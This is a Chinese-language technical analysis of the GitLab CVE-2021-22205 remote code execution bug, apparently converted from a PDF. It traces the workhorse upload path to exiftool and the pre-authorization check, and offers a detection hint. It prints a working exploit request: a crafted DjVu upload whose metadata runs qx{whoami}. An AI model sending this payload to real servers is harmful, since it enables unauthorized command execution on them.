1
CVE-OLON-OOOLS Gitlab 前台RCE 分析 之 L、
N、O
L、起因
N、exiftool 的调⽤点
O、授权认证问题 与 CSRF
P、扩展利⽤
起因在于 有师傅私信提问了，所以周末研究了下，另外有 ⽂章第3部分是基于此篇的扩展，相⽐⽬前⼤
家所熟知的利⽤会更简便也更通⽤。等明天另发⼀篇。
0、起因
2
从 Github 上搜 https://github.com/search?q=CVE-2021-22205 以及 绝⼤部分⼈使⽤的 ⼤家所熟
知的上传的 第⼆个 请求包⼤概如下 
3
从这个请求包，第⼀直觉有两个问题。
1、gitlab 是如何调⽤ exiftool 的
2、/uploads/user 接⼝是如何做认证授权的 以及 CSRF
补丁在 workhorse/internal/upload/rewrite.go:180
1、exiftool 的调⽤点
Plain Text
复制代码
POST /uploads/user HTTP/1.1
Host: 127.0.0.1:3000
User-Agent: Mozilla/5.0 (compatible; Googlebot/2.1; 
+http://www.google.com/bot.html)
Accept-Encoding: gzip, deflate
Accept: application/json
Connection: close
X-CSRF-Token: 
g0heOBs+YzUAWceQolmjKrXO8nGNJkRV3oXYrnOkECztLMEGnoLeLmeDsR6MorfD2UIRO1Pt8TsXF
OB70NCTwQ==
Referer: http://127.0.0.1:3000//uploads/user
Cookie: 
_gitlab_session_af96fb58ed2fa1b0750f77450f6ea19a32b8a66817cff2290ccd5d460dda8
777=8a02e014393906f0bff9fc22a2e2bc6e; 
experimentation_subject_id=eyJfcmFpbHMiOnsibWVzc2FnZSI6IkltRXdOREk1TWpJNExXRT
BZVFV0TkdVNE9DMWlOekF4TFRJMlpUYzJNV1k1WlRNd1pTST0iLCJleHAiOm51bGwsInB1ciI6ImN
vb2tpZS5leHBlcmltZW50YXRpb25fc3ViamVjdF9pZCJ9fQ%3D%3D-
-42e8f07fbe964e06f9700f975a122a4dcb59fdc5; perf_bar_enabled=true
Content-Length: 305
Content-Type: multipart/form-data; boundary=6dd36a93b958b399f3e98685816fadfa
--6dd36a93b958b399f3e98685816fadfa
Content-Disposition: form-data; name="file"; filename="b9c18b38-3e5d-11ec-
b93b-1c36bbed31f3.jpg"
Content-Type: image/jpeg
AT&TFORM[DJVUINFO
 ,   BGjpANTa5(metadata
  (Copyright "\
" . qx{whoami} . \
" b ") )
--6dd36a93b958b399f3e98685816fadfa--
 1
 2
 3
 4
 5
 6
 7
 8
 9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
4
在 handleExifUpload 中 新增对 图⽚格式 的检测  jpeg 以及 exif
5
从上图 可以看到 这⾏代码
 在 gitlab-workhorse 中 workhorse/internal/upload/exif/exif.go:34
在 startProcessing 进⾏处理时调⽤  exiftool 触发了 rce
Plain Text
复制代码
cleaner, err := exif.NewCleaner(ctx, r)
1
6
因此如果有做 ⼊侵检测的朋友，实际调⽤的⽗命令为
⼀步步回溯调⽤链，可以追溯到 accelerate.go:20 中的 Accelerate 函数
2、授权认证问题 与 CSRF
Plain Text
复制代码
/usr/bin/perl -w /opt/gitlab/embedded/bin/exiftool -all= --IPTC:all --XMP-
iptcExt:all -tagsFromFile @ -ResolutionUnit -XResolution -YResolution -
YCbCrSubSampling -YCbCrPositioning -BitsPerSample -ImageHeight -ImageWidth -
ImageSize -Copyright -CopyrightNotice -Orientation -
1
Plain Text
复制代码
workhorse/internal/upload/accelerate.go:20 Accelerate
  uploads.go: HandleFileUploads
    rewrite.go: rewriteFormFilesFromMultipart
      rewrite.go: handleFilePart
        rewrite.go: handleExifUpload
          rewrite.go: exif.NewCleaner
            exif.go: NewCleaner
              exif.go: startProcessing
1
2
3
4
5
6
7
8
7
⽽从请求包出发 POST /uploads/user HTTP/1.1  对应的处理路由 在 gitlab-workhorse 中 
workhorse/internal/upstream/routes.go:333
因此来看 workhorse/internal/upload/accelerate.go:20 Accelerate
调⽤为
⽽ upload.Accelerate 对应的参数分别为 
Go
复制代码
u.route("POST", userUploadPattern, upload.Accelerate(api, signingProxy, 
preparers.uploads)),
1
8
这边把 Accelerate 的代码格式下，相关参数 以及 对应的回调等看得清楚些
Go
复制代码
api               =》    api := u.APIClient
signingProxy      =》    signingProxy := buildProxy(u.Backend, u.Version, 
signingTripper, u.Config, dependencyProxyInjector)
preparers.uploads =》    preparers := createUploadPreparers(u.Config)
                        func createUploadPreparers(cfg config.Config) 
uploadPreparers {
                            defaultPreparer := 
upload.NewObjectStoragePreparer(cfg)
                            return uploadPreparers{
                                artifacts: defaultPreparer,
                                lfs:       lfs.NewLfsUploadPreparer(cfg, 
defaultPreparer),
                                packages:  defaultPreparer,
                                uploads:   defaultPreparer,
                            }
                        }
 1
 2
 3
 4
 5
 6
 7
 8
 9
10
11
12
13
14
15
16
17
Go
复制代码
func Accelerate(rails PreAuthorizer, h http.Handler, p Preparer) http.Handler 
{
    return rails.PreAuthorizeHandler(
        func(w http.ResponseWriter, r *http.Request, a *api.Response) {
            s := &SavedFileTracker{Request: r}
            opts, _, err := p.Prepare(a)
            if err != nil {
                helper.Fail500(w, r, fmt.Errorf("Accelerate: error preparing 
file storage options"))
                return
            }
        HandleFileUploads(w, r, h, a, s, opts)
        }, 
        "/authorize"
    )
}
 1
 2
 3
 4
 5
 6
 7
 8
 9
10
11
12
13
14
15
16
9
因此 关注 u.APIClient 的 PreAuthorizeHandler 
u 即 upstream 其结构如下
因此在 workhorse/internal/api.go 中 有如下
Go
复制代码
import (
    ...
    apipkg "gitlab.com/gitlab-org/gitlab/workhorse/internal/api"
    ...
)
func newUpstream(
    ...
    up.APIClient = apipkg.NewAPI(
        up.Backend,
        up.Version,
        up.RoundTripper,
    )
    ...
)
 1
 2
 3
 4
 5
 6
 7
 8
 9
10
11
12
13
14
15
16
10
11
把前⾯的 Accelerate 中的调⽤摘录到这边，对应到 
Go
复制代码
func (api *API) PreAuthorizeHandler(next HandleFunc, suffix string) 
http.Handler {
    return http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
        httpResponse, authResponse, err := api.PreAuthorize(suffix, r)
        if httpResponse != nil {
            defer httpResponse.Body.Close()
        }
        if err != nil {
            helper.Fail500(w, r, err)
            return
        }
        // The response couldn't be interpreted as a valid auth response, so
        // pass it back (mostly) unmodified
        if httpResponse != nil && authResponse == nil {
            passResponseBack(httpResponse, w, r)
            return
        }
        httpResponse.Body.Close() // Free up the Puma thread
        copyAuthHeader(httpResponse, w)
        next(w, r, authResponse) 
    })
}
 1
 2
 3
 4
 5
 6
 7
 8
 9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
12
对应到 api.go 中的 PreAuthorizeHandler ，也即参数对应如下
跟⼊ PreAuthorizeHandler  中的 
PreAuthorize  如下
Go
复制代码
    rails.PreAuthorizeHandler(
        func(w http.ResponseWriter, r *http.Request, a *api.Response) {
            s := &SavedFileTracker{Request: r}
            opts, _, err := p.Prepare(a)
            if err != nil {
                helper.Fail500(w, r, fmt.Errorf("Accelerate: error preparing 
file storage options"))
                return
            }
        HandleFileUploads(w, r, h, a, s, opts)
        }, 
        "/authorize"
    )
 1
 2
 3
 4
 5
 6
 7
 8
 9
10
11
12
13
14
Go
复制代码
next => func(w http.ResponseWriter, r *http.Request, a *api.Response) {
            s := &SavedFileTracker{Request: r}
            opts, _, err := p.Prepare(a)
            if err != nil {
                helper.Fail500(w, r, fmt.Errorf("Accelerate: error preparing 
file storage options"))
                return
            }
            HandleFileUploads(w, r, h, a, s, opts)
        }, 
suffix => "/authorize"
 1
 2
 3